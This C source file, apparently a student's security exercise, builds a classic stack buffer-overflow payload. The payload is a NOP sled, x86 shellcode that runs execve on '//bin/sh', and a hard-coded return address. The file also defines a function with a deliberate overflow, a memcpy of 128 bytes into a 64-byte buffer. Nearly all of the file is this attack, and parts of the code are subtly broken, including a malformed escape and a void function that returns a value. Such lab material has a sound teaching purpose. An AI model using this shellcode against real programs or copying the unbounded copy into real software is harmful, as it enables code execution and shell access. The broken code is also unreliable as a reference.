/*
 * buffer_overflow.c
 *
 *  Created on: Oct 16, 2016
 *      Author: student
 */

#ifndef BUFFER_OVERFLOW_C_
#define BUFFER_OVERFLOW_C_

void buffer_overflow_generator(char* result)
{
	//char result[128];
	//c0319090
	char shellcode[] = "\x90\x90\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0a\x04\x01\xcd\x80";
	//printf("nihaohahaha\t%d\n",strlen(shellcode));
	int i=0;
	for(;i!=16;i++)
	{
		result[i]='\x90';
	}
	for(;i!=16+strlen(shellcode);i++)
	{
		result[i]=shellcode[i-16];
		//printf("%d\t%02x\n",i-16,shellcode[i-16]);
	}
	for(;i!=64+12;i++)
	{
		result[i]='\x90';
	}
	result[i++]='\xd8';
	result[i++]='\xd4';
	result[i++]='\xff';
	result[i++]='\xdff';
	//printf(result);
	return result;
}


void vulnerable_cpy(char *input)
{
	//printf("%s",input);
	//printf("\nasd\n");
	char buffer[64];
	memcpy(buffer,input,128);
}
#endif /* BUFFER_OVERFLOW_C_ */
